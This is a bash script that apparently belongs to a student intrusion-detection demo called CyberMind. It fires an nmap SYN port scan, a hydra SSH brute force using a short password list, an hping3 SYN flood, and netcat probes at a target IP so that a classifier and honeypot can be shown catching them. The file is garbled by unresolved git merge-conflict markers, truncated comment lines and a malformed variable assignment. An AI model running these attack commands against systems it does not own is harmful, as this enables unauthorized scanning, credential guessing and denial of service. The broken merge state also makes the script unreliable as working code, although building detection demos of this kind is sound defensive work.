#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════════════╗
<<<<<<< Updated upstream
# ║  CyberMind Demo — Kali Linux Attack Script                              ║
# ║  Run this FROM the Kali machine against the Mac running CyberMind.      ║
# ║  This triggers real traffic that the RF model will classify.            ║
=======
# ║  CyberMind Demo — Parrot OS / Kali Linux Attack Script (UTM)             ║
# ║                                Nmap SYN Po                                          ║
# ║  HOW TO USE:                                                             ║
# ║  1. On your Mac: click "Start Scan" in the dashboard                     ║
# ║  2. Within 3 seconds: run this script on Parrot OS / Kali               ║
# ║  3. Watch the scan result change from SAFE → PORT SCAN / DDOS           ║
>>>>>>> Stashed changes
# ╚══════════════════════════════════════════════════════════════════════════╝
#
# SETUP:
#   1. On Mac: start CyberMind with   sudo bash start_demo.sh
#   2. Find your Mac's IP:            ifconfig en0 | grep inet
#   3. On Kali:  export MAC_IP=192.168.x.x
#                bash kali_attack.sh
#
# ATTACKS PERFORMED (in sequence):
#   1. Nmap port scan        → detected as "port_scan"
#   2. SSH brute force       → detected as "brute_force" (hits honeypot on 2222)
#   3. hping3 DDoS flood     → detected as "ddos"
#   4. Direct honeypot probes → captured by honeypot service
#
# Each attack pauses 5 seconds so the professor can see detection in real-time.

<<<<<<< Updated upstream
set -e

# ─── Config ──────────────────────────────────────────────────────────────────
MAC_IP="${MAC_IP:-}"
if [[ -z "$MAC_IP" ]]; then
  echo "ERROR: Set your Mac's IP first:"
  echo "  export MAC_IP=192.168.x.x"
  echo "  bash kali_attack.sh"
  exit 1
fi
=======
# ── Target MAC IP ─────────────────────────────────────────────────────────────
MAC_IP="127.0.0.1"" 
>>>>>>> Stashed changes

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

<<<<<<< Updated upstream
echo ""
echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║  KALI LINUX ATTACK DEMO — Targeting: ${MAC_IP}           ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}⚠  AUTHORIZED DEMO ONLY — Do not use against machines you don't own.${NC}"
echo ""

sleep 2

# ─── Attack 1: Nmap Port Scan ─────────────────────────────────────────────────
echo -e "${CYAN}[ATTACK 1/4] Nmap Port Scan — nmap -sS -p 1-1000 $MAC_IP${NC}"
echo "  → CyberMind should detect this as PORT_SCAN (medium severity)"
echo ""
nmap -sS -p 1-1000 "$MAC_IP" 2>/dev/null || nmap -p 1-1000 "$MAC_IP"

echo ""
echo -e "${GREEN}✔  Nmap scan complete. Check CyberMind dashboard for detection.${NC}"
sleep 5

# ─── Attack 2: SSH Brute Force (honeypot port 2222) ──────────────────────────
echo ""
echo -e "${CYAN}[ATTACK 2/4] SSH Brute Force — targeting honeypot port 2222${NC}"
echo "  → CyberMind should detect this as BRUTE_FORCE (high severity)"
echo "  → Honeypot screen should show captured connection"
echo ""

if command -v hydra &>/dev/null; then
  # Use a small wordlist for speed
  echo "root
admin
password
123456
test
cybermind" > /tmp/demo_wordlist.txt

  hydra -l admin -P /tmp/demo_wordlist.txt "ssh://${MAC_IP}:2222" -t 4 -f 2>/dev/null || true
  rm -f /tmp/demo_wordlist.txt
else
  echo "  (hydra not found — using manual SSH attempts instead)"
  for i in 1 2 3 4 5; do
    ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
        -o PasswordAuthentication=yes \
        "admin@${MAC_IP}" -p 2222 <<< "wrong_password_$i" 2>/dev/null || true
    sleep 1
  done
fi

echo ""
echo -e "${GREEN}✔  Brute force complete. Check CyberMind honeypot screen.${NC}"
sleep 5

# ─── Attack 3: DDoS Simulation ───────────────────────────────────────────────
echo ""
echo -e "${CYAN}[ATTACK 3/4] hping3 SYN Flood — targeting port 8080 for 10 seconds${NC}"
echo "  → CyberMind should detect this as DDOS (critical severity)"
echo ""

if command -v hping3 &>/dev/null; then
  timeout 10 hping3 -S --flood -p 8080 "$MAC_IP" 2>/dev/null || true
else
  echo "  (hping3 not found — using nmap instead for SYN simulation)"
  nmap -sS --max-rate 500 -p 8080 "$MAC_IP" 2>/dev/null || true
fi

echo ""
echo -e "${GREEN}✔  DDoS simulation complete. Check threat count on dashboard.${NC}"
sleep 5

# ─── Attack 4: Direct Honeypot Connections ───────────────────────────────────
echo ""
echo -e "${CYAN}[ATTACK 4/4] Direct honeypot probes on ports 2222, 2323, 3307${NC}"
echo "  → These connections are captured by the network honeypot"
echo ""

probe() {
  local port=$1
  echo "  Probing port $port..."
  echo "GET / HTTP/1.0" | nc -w 3 "$MAC_IP" "$port" 2>/dev/null || true
  sleep 1
}

probe 2222   # SSH honeypot
probe 2323   # Telnet honeypot
probe 3307   # MySQL honeypot

echo ""
echo -e "${GREEN}✔  Honeypot probes complete. Check CyberMind Honeypot screen.${NC}"
echo ""
echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║  ALL ATTACKS COMPLETE                                        ║${NC}"
echo -e "${RED}║                                                              ║${NC}"
echo -e "${RED}║  Now on the Mac:                                             ║${NC}"
echo -e "${RED}║  1. Click "Start Scan" on the Analyze screen                ║${NC}"
echo -e "${RED}║  2. RF model will classify the captured traffic              ║${NC}"
echo -e "${RED}║  3. Show Honeypot screen for captured connections            ║${NC}"
echo -e "${RED}║  4. Block the Kali IP from the Dashboard                    ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
=======
echo -e "${RED}${BOLD}"
echo -e "╔══════════════════════════════════════════════════════════════╗"
echo -e "║  CYBERMIND DEMO — Parrot OS → Mac (${MAC_IP})          ║"
echo -e "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "${YELLOW}⚡ Start the scan on your Mac dashboard NOW, then watch here.${NC}"
echo ""

# ─── Attack 1: rt Scan ────────────────────────────────────────────
# Sends SYN packets to ports 1-1000. Scapy on Mac sees the SYN flood.
echo -e "${CYAN}[1/3] Nmap SYN Port Scan → ${MAC_IP}${NC}"
nmap -sS -p 1-1000 --min-rate 500 "$MAC_IP" 2>/dev/null \
  || nmap -p 1-1000 "$MAC_IP" 2>/dev/null \
  || echo "  (nmap not found — install with: sudo apt install nmap)"
echo -e "${GREEN}  ✔ Port scan sent.${NC}"

# Small gap between attacks
sleep 2

# ─── Attack 2: SSH Brute Force (Honeypot on port 2222) ───────────────────────
# Sends rapid SSH connection attempts to CyberMind's honeypot.
echo -e "${CYAN}[2/3] SSH Brute Force → ${MAC_IP}:2222${NC}"
echo -e "root\nadmin\npassword\n123456\nadmin123\ntest\nguest\nqwerty" > /tmp/cm_wordlist.txt
hydra -l admin -P /tmp/cm_wordlist.txt "ssh://${MAC_IP}:2222" -t 8 -f 2>/dev/null \
  || echo "  (hydra not found — install with: sudo apt install hydra)"
rm -f /tmp/cm_wordlist.txt
echo -e "${GREEN}  ✔ Brute force sent. Check Honeypot screen.${NC}"

# Small gap between attacks
sleep 2

# ─── Attack 3: SYN Flood DDoS ────────────────────────────────────────────────
# Sends a flood of SYN packets to port 8080 for 15 seconds.
# This generates the most traffic and is the most visible in the classifier.
echo -e "${CYAN}[3/3] SYN Flood (DDoS) → ${MAC_IP}:8080 for 15 seconds${NC}"
timeout 15 hping3 -S --flood -p 8080 "$MAC_IP" 2>/dev/null \
  || timeout 15 hping3 -S -p 8080 "$MAC_IP" 2>/dev/null \
  || echo "  (hping3 not found — install with: sudo apt install hping3)"
echo -e "${GREEN}  ✔ DDoS flood sent.${NC}"

echo ""
echo -e "${RED}${BOLD}"
echo -e "╔══════════════════════════════════════════════════════════════╗"
echo -e "║  ALL ATTACKS SENT!                                           ║"
echo -e "║  → Go back to Mac Dashboard and click 'Start Scan'          ║"
echo -e "║  → You should see PORT SCAN and DDOS detected               ║"
echo -e "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
>>>>>>> Stashed changes
